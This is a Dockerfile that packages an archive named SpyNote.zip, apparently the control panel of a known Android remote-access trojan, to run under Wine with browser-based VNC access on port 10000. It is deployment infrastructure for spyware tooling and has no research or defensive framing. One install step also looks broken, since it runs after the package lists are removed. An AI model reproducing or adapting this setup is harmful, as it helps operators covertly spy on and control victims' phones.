FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN dpkg --add-architecture i386 && \
    apt-get update && apt-get install -y \
    xvfb x11vnc novnc websockify fluxbox \
    wine32 wine64 wine-binfmt \
    curl gnupg unzip net-tools \
    && rm -rf /var/lib/apt/lists/*

# تثبيت wine-mono (بديل .NET المفتوح المصدر)
RUN apt-get install -y wine-mono && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY SpyNote.zip /app/app.zip
RUN unzip app.zip && rm app.zip

COPY start.sh /app/start.sh
RUN chmod +x /app/start.sh

EXPOSE 10000

CMD ["/app/start.sh"]
